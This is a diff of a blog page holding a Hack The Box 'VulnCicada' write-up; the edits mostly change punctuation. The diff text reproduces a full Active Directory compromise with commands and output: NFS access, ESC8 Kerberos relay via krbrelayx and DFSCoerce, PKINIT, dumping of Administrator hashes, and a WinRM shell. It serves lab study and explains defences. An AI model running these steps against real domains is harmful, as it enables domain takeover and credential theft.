@@ -54,7 +54,7 @@
     
 
     <link rel="canonical" href="http://localhost:1313/writeups/htb-vulncicada/">
-    <link href="/style.min.70057854b479eccebd00ce1d33560341c1c0af8cca6befd58da0b5471046514b.css" rel="stylesheet">
+    <link href="/style.min.2dc4fd9484cccdeb4e540eaff87cc3f2c37bacb70d134bbaec04ff76525358fc.css" rel="stylesheet">
     <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
 
     
@@ -206,7 +206,7 @@ stroke-linejoin="round" class="feather feather-home">
     <div class="mini-toc-content" id="miniTocContent"></div>
 </div>
             <div class="page-content">
-                <p>This one genuinely surprised me at almost every step. The entry was a photo on an NFS share with a password on a sticky note - an Easy-box trick on what turns out to be a Medium machine. Then the environment punches back: NTLM is disabled domain-wide, so every standard relay tool, every classic pass-the-hash shortcut, just bounces. The ADCS scan comes back with ESC8, web enrollment over HTTP. Normally that&rsquo;s an NTLM relay to certsrv. Without NTLM it looks dead. But &ldquo;NTLM is disabled&rdquo; doesn&rsquo;t mean relay attacks are impossible - it means you have to do it with Kerberos instead, which is a completely different mechanism that&rsquo;s conceptually harder to grasp. You control the DNS name, so you control the SPN the DC requests a ticket for, so you can be the legitimate endpoint that ticket was meant for and turn around and use it at certsrv. I didn&rsquo;t know this was even a thing before this box. Tons of learning, exactly what a good Medium should feel like.</p>
+                <p>This one genuinely surprised me at almost every step. The entry was a photo on an NFS share with a password on a sticky note, an Easy-box trick on what turns out to be a Medium machine. Then the environment punches back: NTLM is disabled domain-wide, so every standard relay tool, every classic pass-the-hash shortcut, just bounces. The ADCS scan comes back with ESC8, web enrollment over HTTP. Normally that&rsquo;s an NTLM relay to certsrv. Without NTLM it looks dead. But &ldquo;NTLM is disabled&rdquo; doesn&rsquo;t mean relay attacks are impossible. It means you have to do it with Kerberos instead, which is a completely different mechanism that&rsquo;s conceptually harder to grasp. You control the DNS name, so you control the SPN the DC requests a ticket for, so you can be the legitimate endpoint that ticket was meant for and turn around and use it at certsrv. I didn&rsquo;t know this was even a thing before this box. Tons of learning, exactly what a good Medium should feel like.</p>
 <h2 id="recon">Recon</h2>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">…/labs/vulncicada ❯ sudo nmap -sV -sC -T4 <span class="nv">$DC</span>
 </span></span><span class="line"><span class="cl">Starting Nmap 7.99 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2026-06-09 09:34 +0100
@@ -240,7 +240,7 @@ stroke-linejoin="round" class="feather feather-home">
 </span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-security-mode: 
 </span></span><span class="line"><span class="cl"><span class="p">|</span>   3.1.1: 
 </span></span><span class="line"><span class="cl"><span class="p">|</span>_    Message signing enabled and required
-</span></span></code></pre></div><p>Domain is <code>cicada.vl</code>, DC is <code>DC-JPQ225</code>. Two things stand out immediately. First, NFS on port 2049 - unusual on a Windows DC, worth checking. Second, the first SMB probe tells you everything:</p>
+</span></span></code></pre></div><p>Domain is <code>cicada.vl</code>, DC is <code>DC-JPQ225</code>. Two things stand out immediately. First, NFS on port 2049, unusual on a Windows DC, worth checking. Second, the first SMB probe tells you everything:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">…/labs/vulncicada ❯ nxc smb <span class="nv">$DC</span> -u <span class="s1">&#39;&#39;</span> -p <span class="s1">&#39;&#39;</span>
 </span></span><span class="line"><span class="cl">SMB         10.129.18.173   <span class="m">445</span>    DC-JPQ225        <span class="o">[</span>*<span class="o">]</span>  x64 <span class="o">(</span>name:DC-JPQ225<span class="o">)</span> <span class="o">(</span>domain:cicada.vl<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:None<span class="o">)</span> <span class="o">(</span>NTLM:False<span class="o">)</span>
 </span></span><span class="line"><span class="cl">SMB         10.129.18.173   <span class="m">445</span>    DC-JPQ225        <span class="o">[</span>-<span class="o">]</span> cicada.vl<span class="se">\:</span> STATUS_NOT_SUPPORTED 
@@ -276,7 +276,7 @@ stroke-linejoin="round" class="feather feather-home">
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="m">14</span> directories, <span class="m">2</span> files
 </span></span></code></pre></div><p>User profile directories for the whole domain, readable over NFS. Two files exist: <code>vacation.png</code> under Administrator and <code>marketing.png</code> under Rosie.Powell. Documents folders throw errors.</p>
-<p>The files are owned by UID <code>4294967294</code> (<code>0xFFFFFFFE</code>). This is how Windows maps AD account SIDs over NFS when there&rsquo;s no LDAP/Winbind ID mapping configured. Instead of a real Unix UID, the SID gets hashed into this placeholder value. Linux enforces file permissions by UID, so reading these files is blocked - the process running as UID 1000 has no ownership claim over a file owned by <code>4294967294</code>.</p>
+<p>The files are owned by UID <code>4294967294</code> (<code>0xFFFFFFFE</code>). This is how Windows maps AD account SIDs over NFS when there&rsquo;s no LDAP/Winbind ID mapping configured. Instead of a real Unix UID, the SID gets hashed into this placeholder value. Linux enforces file permissions by UID, so reading these files is blocked. The process running as UID 1000 has no ownership claim over a file owned by <code>4294967294</code>.</p>
 <p>The fix is to create a local user with exactly that UID and run the copy as them:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo useradd -u <span class="m">4294967294</span> -M -s /bin/bash nfstemp
 </span></span><span class="line"><span class="cl">sudo -u nfstemp cp /tmp/nfs_mount/Rosie.Powell/marketing.png /tmp/
@@ -345,7 +345,7 @@ stroke-linejoin="round" class="feather feather-home">
 </span></span><span class="line"><span class="cl">SMB         DC-JPQ225.cicada.vl <span class="m">445</span>    DC-JPQ225        NETLOGON        READ            Logon server share
 </span></span><span class="line"><span class="cl">SMB         DC-JPQ225.cicada.vl <span class="m">445</span>    DC-JPQ225        profiles$       READ,WRITE      
 </span></span><span class="line"><span class="cl">SMB         DC-JPQ225.cicada.vl <span class="m">445</span>    DC-JPQ225        SYSVOL          READ            Logon server share
-</span></span></code></pre></div><p><code>CertEnroll</code> is the ADCS share - there&rsquo;s a CA running. I noted it and moved on for now. The other thing that jumped out: <code>profiles$</code> with READ,WRITE. Earlier over NFS we couldn&rsquo;t get into Rosie&rsquo;s Documents folder because of the UID mismatch. Maybe accessing it via authenticated SMB would expose it differently. Got a TGT with <code>kinit</code> and browsed with <code>smbclient.py</code>:</p>
+</span></span></code></pre></div><p><code>CertEnroll</code> is the ADCS share. There&rsquo;s a CA running. I noted it and moved on for now. The other thing that jumped out: <code>profiles$</code> with READ,WRITE. Earlier over NFS we couldn&rsquo;t get into Rosie&rsquo;s Documents folder because of the UID mismatch. Maybe accessing it via authenticated SMB would expose it differently. Got a TGT with <code>kinit</code> and browsed with <code>smbclient.py</code>:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">kinit Rosie.Powell@CICADA.VL
 </span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span><span class="k">$(</span>klist <span class="p">|</span> grep <span class="s2">&#34;Credentials cache&#34;</span> <span class="p">|</span> awk <span class="s1">&#39;{print $NF}&#39;</span><span class="k">)</span>
 </span></span><span class="line"><span class="cl">
@@ -388,8 +388,8 @@ stroke-linejoin="round" class="feather feather-home">
 </span></span></span><span class="line"><span class="cl"><span class="s1">[-] User Megan.Simpson doesn&#39;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
 </span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> User Richard.Gibbons doesn<span class="s1">&#39;t have UF_DONT_REQUIRE_PREAUTH set
 </span></span></span><span class="line"><span class="cl"><span class="s1">[-] User Rosie.Powell doesn&#39;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
-</span></span></code></pre></div><p>No SPNs. No AS-REP roastable accounts. Checked Remote Management Users and Remote Desktop Users - both empty groups. NTLM being disabled kills psexec too, so lateral movement via service creation was off the table.</p>
-<p>At this point I had run out of obvious moves. I stopped and thought about what was actually there: a CA, an ESC8 finding from the initial certipy scan I hadn&rsquo;t run yet, and a Kerberos-only environment. The challenge author put that ADCS instance there for a reason. ESC8 normally means NTLM relay to the web enrollment endpoint - but NTLM is disabled. I hadn&rsquo;t seriously considered ADCS as a lateral movement path before, because every writeup I&rsquo;d read used it for privilege escalation. Running certipy now:</p>
+</span></span></code></pre></div><p>No SPNs. No AS-REP roastable accounts. Checked Remote Management Users and Remote Desktop Users, both empty groups. NTLM being disabled kills psexec too, so lateral movement via service creation was off the table.</p>
+<p>At this point I had run out of obvious moves. I stopped and thought about what was actually there: a CA, an ESC8 finding from the initial certipy scan I hadn&rsquo;t run yet, and a Kerberos-only environment. The challenge author put that ADCS instance there for a reason. ESC8 normally means NTLM relay to the web enrollment endpoint, but NTLM is disabled. I hadn&rsquo;t seriously considered ADCS as a lateral movement path before, because every writeup I&rsquo;d read used it for privilege escalation. Running certipy now:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">…/labs/vulncicada ❯ certipy find -k -no-pass -u Rosie.Powell@cicada.vl -target DC-JPQ225.cicada.vl -dc-ip 10.129.18.173 -stdout -vulnerable
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="sb">```</span>bash
@@ -433,13 +433,13 @@ stroke-linejoin="round" class="feather feather-home">
 </span></span><span class="line"><span class="cl">    <span class="o">[</span>!<span class="o">]</span> Vulnerabilities
 </span></span><span class="line"><span class="cl">      ESC8                              : Web Enrollment is enabled over HTTP.
 </span></span><span class="line"><span class="cl">Certificate Templates                   : <span class="o">[</span>!<span class="o">]</span> Could not find any certificate templates
-</span></span></code></pre></div><p>ESC8. Web enrollment over HTTP. This is usually a pure NTLM relay attack - you coerce a machine account to authenticate, relay that NTLM authentication to the web enrollment endpoint at <code>/certsrv/</code>, and request a certificate on behalf of the victim. But NTLM is disabled. That should kill it.</p>
+</span></span></code></pre></div><p>ESC8. Web enrollment over HTTP. This is usually a pure NTLM relay attack. You coerce a machine account to authenticate, relay that NTLM authentication to the web enrollment endpoint at <code>/certsrv/</code>, and request a certificate on behalf of the victim. But NTLM is disabled. That should kill it.</p>
 <p>The reason the author put ESC8 here despite NTLM being off is the key insight: <strong>disabling NTLM doesn&rsquo;t disable relay attacks, it just changes the relay protocol</strong>.</p>
 <h2 id="esc8-via-kerberos-relay">ESC8 via Kerberos Relay</h2>
-<p>To understand why Kerberos relay works here, you need to understand why NTLM relay works in general - and what&rsquo;s fundamentally different about Kerberos.</p>
+<p>To understand why Kerberos relay works here, you need to understand why NTLM relay works in general, and what&rsquo;s fundamentally different about Kerberos.</p>
 <p>NTLM is a challenge-response protocol with no binding to a specific target. When a client authenticates via NTLM, the response doesn&rsquo;t contain any information about which server it was intended for. You can capture that response and replay it to any service that accepts NTLM. That&rsquo;s why disabling NTLM breaks the classic attack.</p>
-<p>Kerberos tickets are different - they&rsquo;re cryptographically bound to a specific Service Principal Name (SPN), like <code>HTTP/DC-JPQ225.cicada.vl</code>. You can&rsquo;t forward a ticket for one SPN to a different service. Which means Kerberos relay should be impossible.</p>
-<p>The trick is this: <strong>if you control the DNS name the victim resolves to, you also control the SPN they request a ticket for</strong>. When you add a DNS A record for <code>attacker.cicada.vl</code> pointing at your machine, and then coerce <code>DC-JPQ225$</code> to authenticate to <code>attacker.cicada.vl</code>, the DC requests a Kerberos ticket for <code>HTTP/attacker.cicada.vl</code>. You registered that name, so <code>krbrelayx</code> can act as the legitimate HTTP service at that address - it can respond to the AP-REQ because it controls the service. And because the DC thinks it&rsquo;s talking to a real service, not a relay, it hands over a valid service ticket. krbrelayx then turns around and presents that ticket to certsrv, which sees an authentication from <code>DC-JPQ225$</code> and issues a <code>DomainController</code> template certificate.</p>
+<p>Kerberos tickets are different. They&rsquo;re cryptographically bound to a specific Service Principal Name (SPN), like <code>HTTP/DC-JPQ225.cicada.vl</code>. You can&rsquo;t forward a ticket for one SPN to a different service. Which means Kerberos relay should be impossible.</p>
+<p>The trick is this: <strong>if you control the DNS name the victim resolves to, you also control the SPN they request a ticket for</strong>. When you add a DNS A record for <code>attacker.cicada.vl</code> pointing at your machine, and then coerce <code>DC-JPQ225$</code> to authenticate to <code>attacker.cicada.vl</code>, the DC requests a Kerberos ticket for <code>HTTP/attacker.cicada.vl</code>. You registered that name, so <code>krbrelayx</code> can act as the legitimate HTTP service at that address, and it can respond to the AP-REQ because it controls the service. And because the DC thinks it&rsquo;s talking to a real service, not a relay, it hands over a valid service ticket. krbrelayx then turns around and presents that ticket to certsrv, which sees an authentication from <code>DC-JPQ225$</code> and issues a <code>DomainController</code> template certificate.</p>
 <p><em>Reference: <a href="https://www.thehacker.recipes/ad/movement/kerberos/relay">The Hacker Recipes - Kerberos Relay</a></em></p>
 <p><img src="/images/writeups/htb-vulncicada/krbrelayx-kerberos-relay-chain-diagram.png" alt="Diagram showing the Kerberos relay attack chain: RPC coercion forces DC to authenticate using a marshalled DNS hostname, krbrelayx receives the AP-REQ as the legitimate endpoint and relays it to certsrv to obtain a DC machine certificate"></p>
 <p>There&rsquo;s one more piece: the DNS name used isn&rsquo;t just any hostname, it&rsquo;s a specially crafted string that includes a marshalled <code>CREDENTIAL_TARGET_INFORMATION</code> structure. When Windows builds an SPN for a connection, it calls <code>SecMakeSPNEx2</code> which internally calls <code>CredMarshalTargetInfo</code>, appending a Base64-encoded structure to the hostname. The string looks like:</p>
@@ -455,7 +455,7 @@ stroke-linejoin="round" class="feather feather-home">
 </span></span><span class="line"><span class="cl">permission: CREATE_CHILD
 </span></span></code></pre></div><p>All prerequisites checked. Time to run it.</p>
 <h3 id="step-1-start-krbrelayx">Step 1: Start krbrelayx</h3>
-<p><code>krbrelayx</code> listens for incoming Kerberos AP-REQ messages and relays them to the target - in this case the certsrv HTTP endpoint. The <code>DomainController</code> template is the one that produces a machine account certificate usable for PKINIT.</p>
+<p><code>krbrelayx</code> listens for incoming Kerberos AP-REQ messages and relays them to the target, in this case the certsrv HTTP endpoint. The <code>DomainController</code> template is the one that produces a machine account certificate usable for PKINIT.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">krbrelayx master ❯ sudo python3 krbrelayx.py --target http://DC-JPQ225.cicada.vl/certsrv/certfnsh.asp --adcs --template DomainController --interface-ip 10.10.16.129
 </span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Protocol Client HTTPS loaded..
 </span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Protocol Client HTTP loaded..
@@ -474,7 +474,7 @@ stroke-linejoin="round" class="feather feather-home">
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">krbrelayx master ✗ bloodyAD -d cicada.vl -u Rosie.Powell -p <span class="s1">&#39;Cicada123&#39;</span> --host DC-JPQ225.cicada.vl --dc-ip 10.129.18.173 -k add dnsRecord <span class="s1">&#39;DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA&#39;</span> 10.10.16.129
 </span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA has been successfully added
 </span></span></code></pre></div><h3 id="step-3-coerce-the-dc-via-dfscoerce">Step 3: Coerce the DC via DFSCoerce</h3>
-<p>DFSCoerce triggers an outbound authentication from <code>DC-JPQ225$</code> via the MS-DFSNM protocol. The coercion target is the crafted hostname. <code>ERROR_BAD_NETPATH</code> is the expected response - it means the DC tried to reach the hostname, triggered the authentication, and got back a network error because our listener doesn&rsquo;t actually respond like a DFS server. The important thing happened: the AP-REQ was sent.</p>
+<p>DFSCoerce triggers an outbound authentication from <code>DC-JPQ225$</code> via the MS-DFSNM protocol. The coercion target is the crafted hostname. <code>ERROR_BAD_NETPATH</code> is the expected response. It means the DC tried to reach the hostname, triggered the authentication, and got back a network error because our listener doesn&rsquo;t actually respond like a DFS server. The important thing happened: the AP-REQ was sent.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">DFSCoerce main ❯ <span class="nv">KRB5CCNAME</span><span class="o">=</span>/tmp/krb5cc_1000 python3 dfscoerce.py -k -no-pass <span class="s1">&#39;DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA&#39;</span> DC-JPQ225.cicada.vl
 </span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Connecting to ncacn_np:DC-JPQ225.cicada.vl<span class="o">[</span><span class="se">\P</span>IPE<span class="se">\n</span>etdfs<span class="o">]</span>
 </span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Successfully bound!
@@ -506,7 +506,7 @@ stroke-linejoin="round" class="feather feather-home">
 </span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Writing PKCS#12 certificate to ./unknown2343.pfx
 </span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Certificate successfully written to file
 </span></span></code></pre></div><h2 id="pkinit-to-domain-admin">PKINIT to Domain Admin</h2>
-<p>With a certificate for <code>DC-JPQ225$</code>, PKINIT turns it into a TGT. <code>gettgtpkinit.py</code> from PKINITtools handles this - it performs the AS-REQ exchange using the certificate&rsquo;s private key instead of a password:</p>
+<p>With a certificate for <code>DC-JPQ225$</code>, PKINIT turns it into a TGT. <code>gettgtpkinit.py</code> from PKINITtools handles this. It performs the AS-REQ exchange using the certificate&rsquo;s private key instead of a password:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">PKINITtools master ❯ python3 gettgtpkinit.py -cert-pfx ~/work/htb/labs/vulncicada/unknown4093.pfx cicada.vl/<span class="s1">&#39;DC-JPQ225$&#39;</span> ~/work/htb/labs/vulncicada/dc.ccache
 </span></span><span class="line"><span class="cl">2026-06-09 13:38:34,259 minikerberos INFO     Loading certificate and key from file
 </span></span><span class="line"><span class="cl">2026-06-09 13:38:34,523 minikerberos INFO     Requesting TGT
@@ -527,7 +527,7 @@ stroke-linejoin="round" class="feather feather-home">
 </span></span><span class="line"><span class="cl">Administrator:aes128-cts-hmac-sha1-96:926e5da4d5cd0be6e1cea21769bb35a4
 </span></span><span class="line"><span class="cl">Administrator:des-cbc-md5:fd2a29621f3e7604
 </span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Cleaning up...
-</span></span></code></pre></div><p>NTLM is disabled so pass-the-hash over SMB won&rsquo;t work. Instead, use the NT hash to request a TGT via <code>getTGT.py</code> - this is still valid because Kerberos AS-REQ with RC4 encryption uses the NT hash directly:</p>
+</span></span></code></pre></div><p>NTLM is disabled so pass-the-hash over SMB won&rsquo;t work. Instead, use the NT hash to request a TGT via <code>getTGT.py</code>. This is still valid because Kerberos AS-REQ with RC4 encryption uses the NT hash directly:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">PKINITtools master ❯ getTGT.py -hashes :85a0da53871a9d56b6cd05deda3a5e87 cicada.vl/Administrator@DC-JPQ225.cicada.vl
 </span></span><span class="line"><span class="cl">Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
 </span></span><span class="line"><span class="cl">
@@ -536,7 +536,7 @@ stroke-linejoin="round" class="feather feather-home">
 </span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>~/work/htb/labs/vulncicada/Administrator@DC-JPQ225.cicada.vl.ccache
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ evil-winrm -i DC-JPQ225.cicada.vl -r CICADA.VL
 </span></span></code></pre></div><p>Administrator shell. Root flag.</p>
-<p>The mental model I&rsquo;d take from this: &ldquo;NTLM disabled&rdquo; is a hardening measure that kills a class of relay attacks, but relay attacks as a concept are not NTLM-specific. Anything where you can be the target the victim authenticates to, and then turn around and use that authentication against a third party, is a relay attack. With Kerberos, the binding to SPNs looks like it prevents this - until you realize that DNS control means SPN control. This is why Kerberos-only environments still need coercion mitigations, and why the attack surface of AD is genuinely hard to fully lock down.</p>
+<p>The mental model I&rsquo;d take from this: &ldquo;NTLM disabled&rdquo; is a hardening measure that kills a class of relay attacks, but relay attacks as a concept are not NTLM-specific. Anything where you can be the target the victim authenticates to, and then turn around and use that authentication against a third party, is a relay attack. With Kerberos, the binding to SPNs looks like it prevents this, until you realize that DNS control means SPN control. This is why Kerberos-only environments still need coercion mitigations, and why the attack surface of AD is genuinely hard to fully lock down.</p>
 <p><em>References:</em></p>
 <ul>
 <li><em><a href="https://dirkjanm.io/relaying-kerberos-over-dns-with-krbrelayx-and-mitm6/">Dirk-jan Mollema - Relaying Kerberos over DNS with krbrelayx and mitm6</a></em> - the author of krbrelayx explaining the DNS SOA trick and how Kerberos relay over HTTP works mechanically</li>
@@ -667,6 +667,11 @@ stroke-linejoin="round" class="feather feather-home">
 </svg>
 
 </a>
+
+
+    
+
+
 
 
     
